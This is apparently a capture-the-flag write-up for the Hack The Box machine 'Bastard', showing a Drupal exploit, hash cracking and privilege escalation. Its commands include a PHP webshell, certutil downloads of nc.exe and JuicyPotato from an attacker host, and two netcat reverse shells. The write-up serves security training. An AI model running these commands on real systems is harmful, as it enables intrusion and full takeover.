# Bastard

### Nmap Full port scan (TCP)

<figure><img src="../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

### Nmap Aggressive scan

<figure><img src="../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

### Enumerating Web Server

Drupal —> droopscan

```bash
droopescan scan drupal -u http://10.10.10.9/ -t 32
```

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

`searchsploit -m 41564`

<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

Change this part of the code

<figure><img src="../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

Install `php-curl` using `apt-get install php-curl`

Run the exploit using `php 41564.php`

<figure><img src="../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

`user.json`

<figure><img src="../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

Identify the hash type using `hashcat --identify admin.hash`

<figure><img src="../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

Brute-forcing the hash

`hashcat -m 7900 -a 0 admin.hash /usr/share/wordlists/rockyou.txt`

…. takes way too long so I decided to just obtain RCE from the box

Putting in a php one-liner webshell `<?php system($_GET["cmd"]); ?>`

<figure><img src="../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Able to use the webshell by go to the URL:

[`http://10.10.10.9/cmd.php?cmd=whoami`](http://10.10.10.9/cmd.php?cmd=whoami)

<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

`http://10.10.10.9/cmd.php?cmd=certutil -urlcache -f <http://10.10.14.6/nc.exe> c:\\\\windows\\\\temp\\\\nc.exe`

<figure><img src="../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

To obtain a user shell, use the following command

`http://10.10.10.9/cmd.php?cmd=nc.exe -e cmd.exe 10.10.14.6 443`

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

* `whoami /priv`

![](<../../.gitbook/assets/image (184).png>)

* `SeImpersonatePrivilege` is enabled —> juicypotato attack?
* Transfer `juicypotato.exe` to the victim

```bash
certutil -urlcache -f http://10.10.14.6/juicypotato.exe juicypotato.exe
```

* For win server 2012 —> CLSID {C49E32C6-BC8B-11d2-85D4-00105A1F8304}

```bash
juicypotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c C:\\inetpub\\drupal-7.54\\nc.exe -e cmd.exe 10.10.14.6 4444" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
```

* GOT ROOT!

<figure><img src="../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>
